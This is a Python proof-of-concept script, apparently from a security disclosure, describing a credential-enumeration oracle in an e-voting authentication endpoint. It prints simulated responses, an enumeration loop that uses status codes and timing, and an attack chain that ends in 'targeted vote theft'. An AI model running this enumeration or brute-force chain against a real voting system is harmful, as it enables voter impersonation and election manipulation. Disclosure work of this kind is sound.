#!/usr/bin/env python3
"""
PoC: SP-028 — Authentication Timing/Error Oracle

The authentication endpoint returns different error responses for:
  1. Invalid credential ID (voter doesn't exist)
  2. Valid credential ID + wrong challenge response
  3. Valid credential ID + correct challenge response

This allows an attacker to enumerate valid voter credential IDs
before attempting authentication, significantly reducing the
attack surface for brute-force attempts.

The error differentiation occurs in the authentication service
where credential lookup failure produces a different code path
than challenge validation failure.

Source:
  AuthenticationService.java — different exceptions per failure mode
  VotingServerController — error responses leak authentication state
"""

import time
import json

VOTING_SERVER = "https://<voting-server>:8443"
AUTH_ENDPOINT = "/api/v1/authentication/electionevent/{ee_id}/credential/{cred_id}"

print("=" * 60)
print("SP-028: Authentication Oracle — Credential Enumeration")
print("=" * 60)
print()
print("Attack: Enumerate valid voter credential IDs via")
print("        differential error responses.")
print()

# Simulated response patterns
responses = {
    "invalid_credential": {
        "status": 404,
        "body": {"error": "Credential not found"},
        "timing_ms": 2,
        "note": "Fast rejection — no DB lookup for challenge"
    },
    "valid_credential_wrong_response": {
        "status": 401,
        "body": {"error": "Authentication failed"},
        "timing_ms": 150,
        "note": "Slow — performs Argon2 hash comparison"
    },
    "valid_credential_correct": {
        "status": 200,
        "body": {"token": "..."},
        "timing_ms": 155,
        "note": "Similar to wrong response timing"
    }
}

print("Response differentiation:")
print()
for scenario, data in responses.items():
    print(f"  Scenario: {scenario}")
    print(f"    HTTP Status: {data['status']}")
    print(f"    Response:    {json.dumps(data['body'])}")
    print(f"    Timing:      ~{data['timing_ms']}ms")
    print(f"    Note:        {data['note']}")
    print()

print("--- Enumeration Script Logic ---")
print()
print("  for cred_id in candidate_credential_ids:")
print("      start = time.monotonic()")
print("      resp = requests.post(")
print(f"          f\"{AUTH_ENDPOINT}\",")
print("          json={{'challengeResponse': 'dummy'}}")
print("      )")
print("      elapsed = time.monotonic() - start")
print()
print("      if resp.status_code == 401:")
print("          # Valid credential! (got to challenge check)")
print("          valid_voters.append(cred_id)")
print("      elif resp.status_code == 404:")
print("          # Invalid credential (fast rejection)")
print("          pass")
print("      elif elapsed > 0.1:")
print("          # Timing oracle: slow = valid credential")
print("          valid_voters.append(cred_id)")
print()
print("--- Attack Chain ---")
print()
print("  1. Enumerate valid credential IDs (this PoC)")
print("  2. For each valid credential, determine challenge type")
print("  3. If YEAR_OF_BIRTH mode (SP-006): only ~100 values")
print("  4. Brute-force with 5 attempts per credential")
print("  5. ~5% success rate per targeted voter")
print()
print("Combined severity: SP-028 + SP-006 = targeted vote theft")
